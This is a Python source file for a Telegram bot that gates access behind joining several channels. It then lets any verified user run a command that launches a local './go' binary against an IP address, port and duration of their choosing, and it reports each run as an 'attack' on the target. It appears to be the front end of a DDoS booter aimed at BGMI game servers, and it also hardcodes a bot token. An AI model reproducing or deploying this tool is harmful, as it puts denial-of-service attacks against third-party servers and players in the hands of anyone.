import time
import asyncio
import subprocess
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Bot Token
BOT_TOKEN = "7798485138:AAE9LLHjyEWgeqCbY9XLLVM_Si8psEV37i8"

# Required channels
REQUIRED_CHANNELS = [
    {"name": "Patel Ji", "link": "@patel_ji47"},
    {"name": "NEXION GAMING", "link": "@NEXION_GAMING"},
    {"name": "NEXION FEEDBACK", "link": "@NEXION_FEEDBACK"},
    {"name": "NEXION GAMEING CHAT", "link": "@NEXION_GAMEING_CHAT"},
    {"name": "Flash Main Channel", "link": "@flashmainchannel"}
]

# Admin ID
ADMIN_ID = 1847934841

# File to store user IDs
USER_FILE = "users.txt"
VERIFIED_USERS_FILE = "verified_users.txt"

# Cooldown management
user_cooldowns = {}
COOLDOWN_TIME = 60 * 60  # 1 hour cooldown
EXTENDED_COOLDOWN_TIME = 2 * 60 * 60  # 2 hour cooldown

# Verified users set
verified_users = set()

# -------------------- Helper Functions --------------------

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return set(int(line.strip()) for line in file)
    except FileNotFoundError:
        return set()

def save_user(user_id):
    users = load_users()
    if user_id not in users:
        with open(USER_FILE, "a") as file:
            file.write(f"{user_id}\n")

def load_verified_users():
    try:
        with open(VERIFIED_USERS_FILE, "r") as file:
            return set(int(line.strip()) for line in file)
    except FileNotFoundError:
        return set()

def save_verified_user(user_id):
    if user_id not in verified_users:
        with open(VERIFIED_USERS_FILE, "a") as file:
            file.write(f"{user_id}\n")

# Load verified users at startup
verified_users = load_verified_users()

async def check_user_joined(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if user_id in verified_users:
        return True

    for channel in REQUIRED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=channel["link"], user_id=user_id)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        except Exception:
            return False

    verified_users.add(user_id)
    save_verified_user(user_id)
    return True

# -------------------- Bot Command Handlers --------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    save_user(user.id)

    buttons = [
        [InlineKeyboardButton(channel["name"], url=f"https://t.me/{channel['link'][1:]}")] for channel in REQUIRED_CHANNELS
    ]
    buttons.append([InlineKeyboardButton("Check ✅", callback_data="check_channels")])
    keyboard = InlineKeyboardMarkup(buttons)

    message = (
        f"Hi {user.first_name}!\n\nTo use this bot, you must join the following channels. Click the buttons below to join, then click 'Check ✅':"
    )

    await update.message.reply_text(message, reply_markup=keyboard)

async def check_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user

    await query.answer()

    if await check_user_joined(user.id, context):
        await query.edit_message_text("✅ You have joined all required channels! You can now use the bot. Enter the format: /bgmi <IP> <PORT> <TIME>.")
    else:
        buttons = [
            [InlineKeyboardButton(channel["name"], url=f"https://t.me/{channel['link'][1:]}")] for channel in REQUIRED_CHANNELS
        ]
        buttons.append([InlineKeyboardButton("Check ✅", callback_data="check_channels")])
        keyboard = InlineKeyboardMarkup(buttons)

        await query.edit_message_text(
            "❌ You haven't joined all required channels. Please join them and click 'Check ✅'.",
            reply_markup=keyboard,
        )

async def bgmi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    save_user(user.id)

    if not await check_user_joined(user.id, context):
        buttons = [
            [InlineKeyboardButton(channel["name"], url=f"https://t.me/{channel['link'][1:]}")] for channel in REQUIRED_CHANNELS
        ]
        buttons.append([InlineKeyboardButton("Check ✅", callback_data="check_channels")])
        keyboard = InlineKeyboardMarkup(buttons)

        await update.message.reply_text(
            "You need to join all required channels before using this bot! Click the buttons below to join, then click 'Check ✅'.",
            reply_markup=keyboard,
        )
        return

    current_time = time.time()
    if user.id in user_cooldowns:
        last_attack_time, attacks_count = user_cooldowns[user.id]
        cooldown_time = EXTENDED_COOLDOWN_TIME if attacks_count > 1 else COOLDOWN_TIME

        remaining_cooldown = cooldown_time - (current_time - last_attack_time)
        if remaining_cooldown > 0:
            minutes = int(remaining_cooldown) // 60
            seconds = int(remaining_cooldown) % 60

            cooldown_message = (
                f"⏳ {user.first_name}, your cooldown is active. Remaining time: {minutes} minutes and {seconds} seconds."
            )
            await update.message.reply_text(cooldown_message)
            return

    try:
        _, ip, port, time_duration = update.message.text.split()
    except ValueError:
        await update.message.reply_text("Invalid command format. Use: /bgmi <IP> <PORT> <TIME>")
        return

    command = ["./go", ip, port, time_duration]

    try:
        subprocess.Popen(command)
        attacks_count = user_cooldowns.get(user.id, (0, 0))[1] + 1
        user_cooldowns[user.id] = (current_time, attacks_count)

        attack_message = (
            f" 🚀 {user.first_name}, attack started at {ip}:{port} for {time_duration} seconds."
        )
        await update.message.reply_text(attack_message)

        context.application.job_queue.run_once(
            notify_attack_finished, when=int(time_duration), data={"chat_id": update.effective_chat.id, "ip": ip, "port": port}
        )

    except Exception as e:
        print(f"Error starting attack: {e}")
        await update.message.reply_text("Failed to start the attack. Please try again later.")

async def notify_attack_finished(context: ContextTypes.DEFAULT_TYPE):
    job_context = context.job.data
    chat_id = job_context["chat_id"]
    ip = job_context["ip"]
    port = job_context["port"]

    finished_message = f"🚀 Attack on {ip}:{port} has completed ✅"
    await context.bot.send_message(chat_id=chat_id, text=finished_message)

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("bgmi", bgmi_command))
    application.add_handler(CallbackQueryHandler(check_channels, pattern="check_channels"))

    application.run_polling()

if __name__ == "__main__":
    main()
